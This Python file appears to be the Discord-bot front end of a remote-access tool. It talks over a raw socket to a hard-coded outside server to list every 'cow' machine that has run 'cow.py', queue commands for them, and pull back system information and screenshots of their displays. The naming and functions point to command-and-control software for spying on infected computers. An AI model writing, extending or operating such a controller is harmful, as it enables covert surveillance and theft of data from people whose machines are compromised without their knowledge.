import discord
from discord.ext import commands
from discord import app_commands
import logging
from dotenv import load_dotenv
import os
import socket

# Function to connect to the server and send commands
def connect(command):
    ip = '54.79.26.131'  # Server IP address
    port = 4570  # Server port
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((ip, port))

    server.send(command.encode())  # Send the command to the server
    response = server.recv(4096).decode()  # Receive the server's response
    server.close()  # Close the connection
    return response

# Function to run remote commands on a specific cow and fetch the result
def run_remote_command(cow: str, command_name: str, payload: str = "") -> str:
    # Tell the server to queue the command for the cow
    connect(f":{command_name}\n{cow}{payload}")

    # Wait for the client to process and send back the response
    import time
    time.sleep(6)  # Wait for the client to process and return

    # Fetch the response
    return connect(f":FETCHRESPONSE\n{cow}\n{command_name}")

# Load the bot token from the .env file
load_dotenv()
token = os.getenv('DISCORD_TOKEN')

# Set up logging for the bot
handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent

# Create the bot object
bot = commands.Bot(command_prefix='!', intents=intents)

# Event that runs when the bot is ready
@bot.event
async def on_ready():
    print(f"{bot.user.name} is ready!")
    await bot.tree.sync()  # Sync commands to Discord

# Command to list all cows that have ever connected
@bot.tree.command(name="listcows", description="List all machines that have ever run cow.py")
async def listCows(interaction: discord.Interaction):
    await interaction.response.send_message("Listing all cows ever seen...")
    machines = connect(":LISTCOWS")  # Get the list of cows
    await interaction.edit_original_response(content=f"```{machines}```") # Send the list back to the user

# Command to fetch the info of a specific cow
@bot.tree.command(name="getinfo", description="Get info of cow")
@app_commands.describe(cow="The cow's name")
async def getInfo(interaction: discord.Interaction, cow: str):
    await interaction.response.send_message("Attempting to get info...")
    info = run_remote_command(cow, "GETINFO")  # Run the command to get info
    await interaction.edit_original_response(content=f"```{info}```") # Send the info back to the user

#Get screenshot of a specific cow
from discord import app_commands
import discord

@bot.tree.command(name="getscreenshot", description="Screenshot the cow's current display")
@app_commands.describe(cow="The cow's name")
async def getScreenshot(interaction: discord.Interaction, cow: str):
    await interaction.response.send_message("Attempting to get screenshot...")
    try:
        screenshot = run_remote_command(cow, "GETSCREENSHOT")  # Should return the URL or error message
        if screenshot.startswith("http"):
            await interaction.followup.send(f"Screenshot from `{cow}`:\n{screenshot}")
        else:
            await interaction.followup.send(f"Failed to get screenshot: `{screenshot}`")
    except Exception as e:
        await interaction.followup.send(f"Error while getting screenshot: `{str(e)}`")

    await interaction.edit_original_response(content=screenshot) # Send the info back to the user

# Run the bot with the provided token
bot.run(token, log_handler=handler, log_level=logging.DEBUG)
